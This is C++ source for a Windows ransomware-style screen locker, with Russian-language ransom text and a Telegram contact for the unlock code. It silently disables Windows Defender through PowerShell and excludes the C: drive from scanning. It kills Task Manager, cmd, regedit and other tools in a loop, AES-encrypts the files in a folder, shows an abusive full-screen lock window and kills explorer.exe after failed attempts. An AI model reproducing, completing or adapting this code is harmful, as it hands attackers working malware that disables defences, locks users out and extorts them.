// language: C++, file: main.cpp, target: Windows 10/11, MSVC
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <bcrypt.h>
#include <mmsystem.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

std::string CORRECT_CODE = "8841";
std::vector<std::wstring> BLOCK_EXE = { L"notepad.exe", L"taskmgr.exe", L"cmd.exe", L"regedit.exe", L"ProcessHacker.exe", L"msconfig.exe", L"iexplore.exe" };

HANDLE hOut;
HWND hMainWnd;

void ElevateAndEvade() {
    if (!IsUserAnAdmin()) {
        wchar_t szPath[MAX_PATH];
        GetModuleFileNameW(NULL, szPath, MAX_PATH);
        ShellExecuteW(NULL, L"runas", szPath, NULL, NULL, SW_SHOW);
        exit(0);
    }
    // Скрытое отключение Defender
    std::wstring cmd = L"powershell.exe -WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\'\"";
    STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    if (CreateProcessW(NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}

void BlockProcesses() {
    while (true) {
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    for (const auto& exe : BLOCK_EXE) {
                        if (_wcsicmp(pe.szExeFile, exe.c_str()) == 0) {
                            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                            if (hProc) { TerminateProcess(hProc, 1); CloseHandle(hProc); }
                        }
                    }
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        Sleep(100);
    }
}

bool EncryptFileAES(const std::wstring& filePath, const std::vector<BYTE>& key, const std::vector<BYTE>& iv) {
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0) { CloseHandle(hFile); return false; }
    std::vector<BYTE> data(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, data.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbData = 0;
    std::vector<BYTE> keyObject;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return false;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    keyObject.resize(cbKeyObject);

    if (BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject.data(), cbKeyObject, (PUCHAR)key.data(), (ULONG)key.size(), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0); return false;
    }

    size_t paddedSize = ((fileSize + 15) / 16) * 16;
    data.resize(paddedSize, 0);
    ULONG cbResult = 0;
    std::vector<BYTE> encryptedData(paddedSize);
    NTSTATUS status = BCryptEncrypt(hKey, data.data(), (ULONG)data.size(), NULL, (PUCHAR)iv.data(), (ULONG)iv.size(), encryptedData.data(), (ULONG)encryptedData.size(), &cbResult, 0);
    BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);

    if (status == 0) {
        hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written; WriteFile(hFile, encryptedData.data(), cbResult, &written, NULL);
            CloseHandle(hFile); return true;
        }
    }
    return false;
}

void EncryptDirectory() {
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    std::wstring dir(szPath);
    dir = dir.substr(0, dir.find_last_of(L"\\/")) + L"\\TestFolder";

    std::vector<BYTE> key(32), iv(16);
    BCryptGenRandom(NULL, key.data(), 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    BCryptGenRandom(NULL, iv.data(), 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    std::wstring keyFile = dir + L"\\..\\system_key.dat";
    HANDLE hKeyFile = CreateFileW(keyFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hKeyFile != INVALID_HANDLE_VALUE) {
        DWORD written; WriteFile(hKeyFile, key.data(), 32, &written, NULL); WriteFile(hKeyFile, iv.data(), 16, &written, NULL);
        CloseHandle(hKeyFile);
    }

    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW((dir + L"\\*").c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                EncryptFileAES(dir + L"\\" + fd.cFileName, key, iv);
            }
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND hEdit, hButton, hResult;
    static int attempts = 0;

    switch (msg) {
    case WM_CREATE: {
        hOut = (HANDLE)GetStockObject(BLACK_BRUSH);
        CreateWindowW(L"STATIC", L"WINDOWS ЗАБЛОКИРОВАН!\n\nВаш компьютер подвержен блокировке хакерской группой Qack.\nЛюбые попытки снять вирус приведут к поломке компьютера,\nтак что не выебывайся ублюдок.\n\nЗа кодом писать @pu709 (Telegram)\n\nВведите пароль:", WS_CHILD | WS_VISIBLE | SS_CENTER, 50, 50, 700, 300, hwnd, NULL, NULL, NULL);
        hEdit = CreateWindowW(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_PASSWORD | ES_NUMBER, 250, 370, 300, 30, hwnd, (HMENU)1, NULL, NULL);
        hButton = CreateWindowW(L"BUTTON", L"ПРОВЕРИТЬ", WS_CHILD | WS_VISIBLE, 300, 420, 200, 40, hwnd, (HMENU)2, NULL, NULL);
        hResult = CreateWindowW(L"STATIC", L"Попыток осталось: 3", WS_CHILD | WS_VISIBLE | SS_CENTER, 250, 470, 300, 30, hwnd, NULL, NULL, NULL);
        break;
    }
    case WM_COMMAND: {
        if (LOWORD(wParam) == 2) {
            wchar_t buf[10];
            GetWindowTextW(hEdit, buf, 10);
            std::wstring wCode(CORRECT_CODE.begin(), CORRECT_CODE.end());
            if (std::wstring(buf) == wCode) {
                MessageBoxW(hwnd, L"Код правильный!", L"OK", MB_OK);
                DestroyWindow(hwnd);
            } else {
                attempts++;
                int left = 3 - attempts;
                if (left > 0) {
                    std::wstring res = L"Неверный код! Осталось: " + std::to_wstring(left);
                    SetWindowTextW(hResult, res.c_str());
                } else {
                    // Мат на весь экран
                    DestroyWindow(hwnd);
                    HWND hTroll = CreateWindowExW(WS_EX_TOPMOST, L"STATIC", L"ЕБАТЬ ТЫ ВЫБЛЯДОК ТУПОЙ", WS_VISIBLE | WS_POPUP | SS_CENTER | SS_CENTERIMAGE, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), NULL, NULL, NULL, NULL);
                    SetWindowLongPtr(hTroll, GWLP_WNDPROC, (LONG_PTR)WndProc);
                    HBRUSH hRed = CreateSolidBrush(RGB(255, 0, 0));
                    SetClassLongPtr(hTroll, GCLP_HBRBACKGROUND, (LONG_PTR)hRed);
                    InvalidateRect(hTroll, NULL, TRUE);
                    
                    // Убийство процессов
                    system("taskkill /f /im explorer.exe");
                    system("taskkill /f /im ctfmon.exe");
                }
            }
        }
        break;
    }
    case WM_CLOSE: return 0;
    case WM_DESTROY: PostQuitMessage(0); break;
    default: return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ElevateAndEvade();
    
    // Поток для блокировки процессов
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)[](LPVOID) -> DWORD { BlockProcesses(); return 0; }, NULL, 0, NULL);
    // Поток для шифрования
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)[](LPVOID) -> DWORD { EncryptDirectory(); return 0; }, NULL, 0, NULL);

    // Звук
    PlaySoundW(L"scream.wav", NULL, SND_FILENAME | SND_ASYNC | SND_LOOP);

    // Окно
    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"LockerWnd";
    RegisterClassW(&wc);

    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST, L"LockerWnd", L"System Locker", WS_POPUP | WS_VISIBLE, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), NULL, NULL, hInstance, NULL);
    hMainWnd = hwnd;
    SetWindowLongW(hwnd, GWL_STYLE, WS_POPUP | WS_VISIBLE);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), SWP_SHOWWINDOW);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
